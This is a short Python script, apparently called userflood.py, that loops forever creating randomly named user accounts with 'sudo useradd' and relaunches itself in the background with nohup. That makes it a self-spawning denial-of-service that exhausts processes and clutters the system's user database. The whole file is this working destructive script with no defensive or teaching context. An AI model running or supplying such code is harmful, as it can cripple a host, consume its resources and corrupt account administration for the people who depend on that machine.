import os
import string
import random
while True:
  rndstr = ""
  i = 0
  while not i == 10:
    i += 1
    rndstr = rndstr + string.ascii_uppercase[random.randint(0, len(string.ascii_uppercase) - 1)]
  os.system("sudo useradd " + rndstr)
  os.system("nohup sudo python3 userflood.py")
